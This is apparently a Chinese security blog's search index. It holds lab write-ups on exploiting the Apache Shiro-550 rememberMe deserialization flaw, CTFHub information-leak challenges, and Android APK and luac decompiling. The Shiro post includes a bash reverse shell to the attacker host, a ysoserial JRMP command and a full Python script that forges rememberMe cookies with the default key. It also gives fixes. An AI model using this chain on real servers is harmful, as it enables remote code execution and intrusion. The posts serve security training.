<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
    <url>/2020/08/06/Vulfocus%E9%9D%B6%E5%9C%BA/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</url>
    <content><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
<p>那么，Payload产生的过程：</p>
<a id="more"></a>
<p>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p>
<p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单</p>
<h2 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h2><h2 id="1-3-特征判断：返回包中包含rememberMe-deleteMe字段"><a href="#1-3-特征判断：返回包中包含rememberMe-deleteMe字段" class="headerlink" title="1.3 特征判断：返回包中包含rememberMe=deleteMe字段"></a>1.3 特征判断：返回包中包含rememberMe=deleteMe字段</h2><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><table>
<thead>
<tr>
<th>角色</th>
<th>系统版本</th>
<th>IP</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>靶机</td>
<td>Centos7</td>
<td>192.168.3.130</td>
<td>Shiro rememberMe反序列化漏洞环境</td>
</tr>
<tr>
<td>攻击机</td>
<td>kali-linux-2020.3</td>
<td>192.168.3.131</td>
<td>工具：maven、ysoserial、Shiro_exploit</td>
</tr>
</tbody></table>
<h3 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a>工具准备：</h3><h4 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h4><p>kali安装<strong>maven</strong>，执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget  https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;3.6.3&#x2F;binaries&#x2F;apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo mv apache-maven-3.6.3 &#x2F;usr&#x2F;local&#x2F;maven3</span><br></pre></td></tr></table></figure>

<p>添加maven环境变量（在/etc/profile末尾添加maven环境变量:）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven3</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$M2_HOME&#x2F;bin</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>

<h4 id="下载ysoserial并打包"><a href="#下载ysoserial并打包" class="headerlink" title="下载ysoserial并打包"></a>下载ysoserial并打包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>

<h4 id="下载Shiro-exploit"><a href="#下载Shiro-exploit" class="headerlink" title="下载Shiro_exploit"></a>下载Shiro_exploit</h4><p>检查是否存在默认的key。安装Shiro_exploit</p>
<p>Github项目地址：<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ol>
<li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>
爆破出默认key如下：</li>
</ol>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080601.png" alt="image"></p>
<ol start="2">
<li><p>攻击机制作反弹shell代码<br>监听本地端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li>
<li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080602.png" alt="image"></p>
</li>
<li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080603.png" alt="image"></p>
<ol start="5">
<li>使用shiro.py 生成Payload</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure>

<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080604.png" alt="image"></p>
<p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>

<h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol>
<li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080605.png" alt="image"></li>
<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080606.png" alt="image"></li>
<li>获得的rememberMe置入cookies中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080607.png" alt="image"></li>
<li>8888端口监听到流量信息</li>
</ol>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080609.png" alt="image"></p>
<h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol>
<li>升级shiro到1.2.5及以上</li>
<li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li>
</ol>
<h2 id="1-9-遇到的问题"><a href="#1-9-遇到的问题" class="headerlink" title="1.9 遇到的问题"></a>1.9 遇到的问题</h2><ol>
<li>maven打包ysoserial时编译报错，需要在kali中安装jdk1.8的环境，配置环境变量（一定不要安装最新版的jdk，还会报错，不清楚原因）</li>
<li>使用Shiro_exploit时报错<strong>No module named Crypto.Cipher</strong>，执行以下命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip uninstall crypto</span><br><span class="line">sudo pip uninstall pycrypto</span><br><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li>
<li>kali2020.2版本默认没有pip，需要安装</li>
</ol>
<p>python3安装pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
<p>python2安装pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure>
<p>检查安装情况<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080610.png" alt="image"></p>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Apache Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Web基础之信息泄露（上）</title>
    <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p>
<p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png" alt="image"></p>
<p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png" alt="image"></p>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081805.png" alt="image"></p>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p>
<p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081806.png" alt="image"></p>
<p>浏览目录找到flag</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081807.png" alt="image"></p>
<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081808.png" alt="image"></p>
<h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p>
<p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p>
<h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081809.png" alt="image"></p>
<h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081810.png" alt="image"></p>
<h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p>
<h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081811.png" alt="image"></p>
<p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081812.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081813.png" alt="image"></p>
<p>用notepad++打开</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081814.png" alt="image"></p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081815.png" alt="image"></p>
<h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p>
<p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p>
<p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p>
<h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p>
<p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081816.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081817.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081818.png" alt="image"></p>
<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081819.png" alt="image"></p>
<h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p>
<p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p>
<p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p>
<h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081820.png" alt="image"></p>
<p>进入Python-dsstore-master目录</p>
<p>依次输入下图的命令：</p>
<p>生成.DS_Store.ctfhub（名字可以自定义）</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081821.png" alt="image"></p>
<p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081822.png" alt="image"></p>
<p>访问我们看到的.txt文件得到flag</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081823.png" alt="image"></p>
]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Web基础之信息泄露（下）</title>
    <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
<p>切换版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure>
<p>对比两次提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
<li><p>扫描发现 .git 泄露</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p>
</li>
<li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p>
</li>
<li><p>执行 git log 查看历史记录</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p>
</li>
<li><p>执行 git show 查看提交详情</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p>
<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
</li>
</ol>
<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol>
<li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p>
</li>
<li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p>
</li>
<li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p>
</li>
<li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p>
</li>
</ol>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p>
<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>
]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>APP之反编译+目录结构+重新打包+重新签名</title>
    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
    <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
<ol>
<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li>
<li>在cmd窗口下进入当前目录</li>
<li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
<p>apktool d qipai.apk</p>
</blockquote>
</li>
<li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote>
<p>apktool b test</p>
</blockquote>
<a id="more"></a>
<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li>
<li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
<li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
<li><strong>classes.dex</strong>：源码文件</li>
<li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li>
<li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li>
<li><strong>META-INF</strong>：apk的签名信息</li>
</ol>
<h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>APP反编译-下载源码</title>
    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
<li>解压<strong>dex2jar.jar</strong>文件</li>
<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li>
<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
<p>d2j-dex2jar.bat classes.dex</p>
</blockquote>
</li>
</ol>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p>
<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li>
<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
</ol>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>luac的解密过程</title>
    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p>
<ol>
<li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li>
<li>加密key与程序内部约定某个值。</li>
</ol>
<p>显然，第一种可以破解，可以再程序中找到解密的值。</p>
<a id="more"></a>
<h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
<ol>
<li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p>
</li>
<li><p>寻找加密<strong>key</strong></p>
<ul>
<li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li>
<li>将<strong>lib\libgame.so</strong>文件拖入工具中</li>
<li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li>
<li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
</ul>
</li>
<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-019 CVE-2013-4316复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
